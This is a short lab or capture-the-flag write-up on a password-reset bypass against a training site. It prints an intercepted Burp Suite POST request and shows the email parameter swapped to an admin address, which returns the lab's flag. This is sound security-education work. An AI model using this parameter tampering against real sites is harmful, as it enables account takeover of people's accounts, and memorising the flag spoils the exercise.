# Reset password bypass
- the password reset request can be manipulated by adding additional email parameters to divert the reset link
- the HTTP referer header may leak the password reset information if it is included in the request
- https://book.hacktricks.xyz/pentesting-web/reset-password

<b>keywords</b>: recover<br>
<b>attacked site</b>: http://borntosec.42/?page=recover

## Exploit
On the sign-in page, we find a link to the password recovery:
```
http://borntosec.42/?page=recover
```
After clicking the recover button, we intercept the POST request using <code>Burp Suite</code>:
``` http
POST /?page=recover HTTP/1.1
Host: 192.168.56.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://192.168.56.106
Connection: close
Referer: http://192.168.56.106/?page=recover
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1

mail=webmaster%40borntosec.com&Submit=Submit
```
We see that the default hidden parameters are sent when no other input is specified, and the email used to reset the password is passed directly in the request. We can modify it to reset the 'admin' password:
``` 
mail=admin%40borntosec.com&Submit=Submit
```
This returns the flag:
```
The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```

## Flag
1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
